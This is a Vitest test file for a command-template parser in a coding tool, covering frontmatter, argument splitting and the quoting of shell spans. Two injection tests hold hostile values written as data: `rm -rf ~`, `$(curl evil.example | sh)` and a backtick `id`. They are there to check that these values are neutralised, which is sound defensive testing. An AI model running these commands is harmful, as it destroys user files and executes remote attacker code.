import { describe, expect, it } from "vitest";

import {
  commandNameFromPath,
  expandCommandTemplate,
  parseCommandFile,
  shellSpanCommands,
  spliceShellOutputs,
  splitArguments,
  type CommandTemplate,
} from "./command-template.js";

const projectDir = "/work/my app";

function template(body: string, extra: Partial<CommandTemplate> = {}): CommandTemplate {
  return { name: "t", argumentNames: [], send: "auto", body, ...extra };
}

describe("parseCommandFile", () => {
  it("reads every frontmatter field and the body", () => {
    const file = [
      "---",
      "description: Review a pull request",
      'argument-hint: "<number> [focus]"',
      "arguments: [number, focus]",
      "profile: reviewer",
      "mode: plan",
      "workspace: worktree",
      "send: review",
      "---",
      "",
      "Review PR $number, focusing on $focus.",
      "",
    ].join("\n");
    expect(parseCommandFile("git:review", file)).toEqual({
      command: {
        name: "git:review",
        description: "Review a pull request",
        argumentHint: "<number> [focus]",
        argumentNames: ["number", "focus"],
        profile: "reviewer",
        mode: "plan",
        workspace: "worktree",
        send: "review",
        body: "Review PR $number, focusing on $focus.",
      },
      problems: [],
    });
  });

  it("reads a dash list and single-quoted strings", () => {
    const { command } = parseCommandFile("fix", "---\ndescription: 'It''s quick'\narguments:\n  - issue\n  - area\n---\nFix $issue");
    expect(command).toMatchObject({ description: "It's quick", argumentNames: ["issue", "area"] });
  });

  it("treats a file without frontmatter as all body, sent automatically", () => {
    expect(parseCommandFile("plain", "Just do it.\n")).toEqual({
      command: { name: "plain", argumentNames: [], send: "auto", body: "Just do it." },
      problems: [],
    });
  });

  it("warns about unknown keys and bad values but keeps the command", () => {
    const { command, problems } = parseCommandFile("x", "---\ncolour: blue\nworkspace: cloud\nsend: later\narguments: [ok, 9bad]\n---\nBody");
    expect(command).toMatchObject({ name: "x", send: "auto", argumentNames: ["ok"], body: "Body" });
    expect(command).not.toHaveProperty("workspace");
    expect(problems).toHaveLength(4);
    expect(problems[0]).toMatch(/line 2.*colour/);
  });

  it("reads an unclosed frontmatter block as body and says so", () => {
    const { command, problems } = parseCommandFile("x", "---\ndescription: oops\nBody");
    expect(command?.body).toBe("---\ndescription: oops\nBody");
    expect(problems[0]).toMatch(/never closed/);
  });

  it("keeps only modes Capsule has", () => {
    const { command, problems } = parseCommandFile("x", "---\nmode: yolo\n---\nBody");
    expect(command).not.toHaveProperty("mode");
    expect(problems[0]).toMatch(/line 2: mode must be one of/);
  });

  it("can read another tool's file without calling its own keys mistakes", () => {
    const file = "---\nallowed-tools: Bash(git diff:*)\ndescription: Commit\nsend: later\n---\nBody";
    const { command, problems } = parseCommandFile("commit", file, { ignoreUnknownKeys: true });
    expect(command).toMatchObject({ description: "Commit", body: "Body" });
    expect(problems).toEqual(["line 4: send must be auto or review."]);
  });

  it("refuses a name that cannot be typed as a command", () => {
    expect(parseCommandFile("Review Thing", "Body").command).toBeUndefined();
    expect(parseCommandFile("-x", "Body").command).toBeUndefined();
  });

  it("names a command in a subfolder with a namespace", () => {
    expect(commandNameFromPath("git/commit.md")).toBe("git:commit");
    expect(commandNameFromPath("review.md")).toBe("review");
  });
});

describe("splitArguments", () => {
  it("splits like a shell", () => {
    expect(splitArguments(`a "b c" 'd "e"' f\\ g "h\\"i" ''`)).toEqual(["a", "b c", 'd "e"', "f g", 'h"i', ""]);
    expect(splitArguments("   ")).toEqual([]);
  });
});

describe("expandCommandTemplate", () => {
  it("substitutes the whole argument text, positions and names", () => {
    const command = template("All: $ARGUMENTS | first: $0 | second: $1 | missing: [$5] | file: $file | other: $filename", {
      argumentNames: ["file"],
    });
    expect(expandCommandTemplate(command, ` src/a.ts "two words" `, { projectDir }).text).toBe(
      'All: src/a.ts "two words" | first: src/a.ts | second: two words | missing: [] | file: src/a.ts | other: $filename',
    );
  });

  it("fills in the project folder", () => {
    expect(expandCommandTemplate(template("cd ${CAPSULE_PROJECT_DIR}"), "", { projectDir }).text).toBe("cd /work/my app");
  });

  it("appends arguments when the body has no placeholder for them", () => {
    expect(expandCommandTemplate(template("Explain this."), "the cache", { projectDir }).text).toBe(
      "Explain this.\n\nARGUMENTS: the cache",
    );
    expect(expandCommandTemplate(template("Explain this."), "  ", { projectDir }).text).toBe("Explain this.");
    expect(expandCommandTemplate(template("In ${CAPSULE_PROJECT_DIR}"), "x", { projectDir }).text).toBe(
      "In /work/my app\n\nARGUMENTS: x",
    );
  });

  it("cuts shell spans out and quotes what goes into them", () => {
    const command = template("Log:\n!`git log --oneline -n 5 -- $0`\nIn !`ls ${CAPSULE_PROJECT_DIR}`");
    const { text, shell } = expandCommandTemplate(command, `"src/my file.ts"`, { projectDir });
    expect(shell.map((s) => s.command)).toEqual(["git log --oneline -n 5 -- 'src/my file.ts'", "ls '/work/my app'"]);
    expect(text).toBe(`Log:\n${shell[0]!.token}\nIn ${shell[1]!.token}`);
  });

  it("keeps an argument from breaking out of its quotes", () => {
    const command = template("!`grep -r $ARGUMENTS .`");
    const attack = `"'; rm -rf ~; echo '" "$(curl evil.example | sh)" "\`id\`"`;
    const { shell } = expandCommandTemplate(command, attack, { projectDir });
    expect(shell).toHaveLength(1);
    expect(shell[0]!.command).toBe(`grep -r ''\\''; rm -rf ~; echo '\\''' '$(curl evil.example | sh)' '\`id\`' .`);
  });

  it("never runs a shell span that arrives in an argument", () => {
    const { text, shell } = expandCommandTemplate(template("Say $ARGUMENTS"), "!`rm -rf ~`", { projectDir });
    expect(shell).toEqual([]);
    expect(text).toBe("Say !`rm -rf ~`");
  });

  it("collects @path mentions but not email addresses", () => {
    const { mentions, text } = expandCommandTemplate(
      template("Read @src/index.ts and (@docs/a.md). Mail me@example.com about @src/index.ts. Also $0"),
      "@README.md",
      { projectDir },
    );
    expect(mentions).toEqual(["src/index.ts", "docs/a.md", "README.md"]);
    expect(text).toContain("@src/index.ts");
  });

  it("counts positions from one for prompt files written that way", () => {
    const { text } = expandCommandTemplate(template("first: $1, second: $2, none: [$0]"), "a b", { projectDir, positionalBase: 1 });
    expect(text).toBe("first: a, second: b, none: []");
  });

  it("lists what a body's shell spans run, before arguments go in", () => {
    expect(shellSpanCommands("A !`git diff $0` B !`ls` C `plain`")).toEqual(["git diff $0", "ls"]);
    expect(shellSpanCommands("No shell here.")).toEqual([]);
  });

  it("splices shell output back in place of each token", () => {
    const { text, shell } = expandCommandTemplate(template("A !`echo 1` B !`echo 2`"), "", { projectDir });
    const outputs = new Map(shell.map((s, i) => [s.token, `out${i + 1}\n`]));
    expect(spliceShellOutputs(text, outputs)).toBe("A out1 B out2");
  });

  it("chooses tokens that cannot collide with the text", () => {
    const { text, shell } = expandCommandTemplate(template("!`date` $ARGUMENTS"), "⟦shell-0⟧", { projectDir });
    expect(spliceShellOutputs(text, new Map([[shell[0]!.token, "TODAY"]]))).toBe("TODAY ⟦shell-0⟧");
  });
});
